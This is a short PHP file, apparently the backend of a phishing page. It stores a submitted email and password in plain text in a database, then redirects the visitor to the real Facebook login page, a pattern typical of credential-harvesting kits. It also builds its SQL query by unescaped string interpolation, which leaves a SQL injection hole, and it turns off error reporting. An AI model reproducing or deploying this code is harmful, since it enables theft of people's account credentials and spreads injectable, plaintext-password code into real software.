<?php
ini_set('display_errors','off');
ini_set('display_startup_errors','off');
error_reporting(0);

include_once 'conexion.php';

class Usuario{
	
    public $correo;
    public $contrasena;
    public $db;

	public function __construct($correo, $contrasena){

		$this->correo = $correo;
		$this->contrasena = $contrasena;		
		$this->db =new Conexion();
	}

	public function insertar(){

				$db = new Conexion();

				$SQL = "INSERT INTO usuario (correo, contrasena)
				VALUES ('$this->correo','$this->contrasena')";
				$this->db->query($SQL);
				if($this->db->errno){
				die('<script language="javascript">alert("NO SE REGISTRO");location.href="../index.php"</script>');
				}else{
				echo '<script language="javascript">location.href="https://es-la.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU3NDgwMDgwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D"</script>';
				
			}
		}

}